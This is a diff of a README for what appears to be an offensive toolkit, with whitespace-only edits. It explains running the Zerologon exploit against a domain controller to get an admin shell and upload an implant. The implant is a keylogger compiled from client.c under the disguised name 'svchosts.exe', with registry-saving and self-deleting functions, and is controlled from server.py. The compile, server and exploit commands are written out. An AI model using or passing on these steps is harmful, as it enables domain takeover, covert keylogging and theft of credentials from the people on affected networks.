@@ -18,7 +18,6 @@ This will perform the zerologon exploit to gain a remote shell with admin privle
 Client.c is should be compiled and named svchosts.exe and put in the same folder as the zerologon.sh when running it to successfully implant and run the executable. This file has the keylogger which hooks the OS, capabilities to save registrar files, and also a kill command which can be used to delete the implant and associated files off of the system. Here is the command used to compile client.c:
 ```bash
 gcc -O3 -static -s client.c -o svchosts.exe -lws2_32
-
 ```
 
 ## server.py
@@ -37,11 +36,9 @@ The commands that can be sent to the implant are:
 3. To start the server, in a separate terminal run:
 ```
 python server.py
-
 ```
 4. Run the following command to gain initial access and upload the implant:
 ```
-    /zerologon DOMAIN DC_NETBIOS_NAME DC_IP_ADDRESS
-    
+/zerologon DOMAIN DC_NETBIOS_NAME DC_IP_ADDRESS   
 ```
 5. In the terminal running the server run any of the commands described above
